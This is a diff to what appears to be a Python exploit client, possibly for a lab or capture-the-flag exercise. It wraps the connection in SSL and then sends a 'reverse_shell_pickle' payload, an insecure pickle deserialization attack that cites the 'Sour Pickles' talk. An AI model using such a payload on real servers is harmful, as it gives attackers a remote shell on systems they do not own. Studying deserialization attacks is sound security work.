@@ -3,6 +3,7 @@ import sys
 import socket
 
 from common import recv_msg
+from cli import ssl_cli_wrap
 
 # Smashing the pickling for fun and profit
 #   - https://sensepost.com/cms/resources/conferences/2011/sour_pickles/BH_US_11_Slaviero_Sour_Pickles.pdf
@@ -67,6 +68,7 @@ def send(s, payload):
 
 if __name__ == "__main__":
     s = sv_conn()
+    s = ssl_cli_wrap(s)
     payload = reverse_shell_pickle()
     send(s, payload)
     print(recv_msg(s))
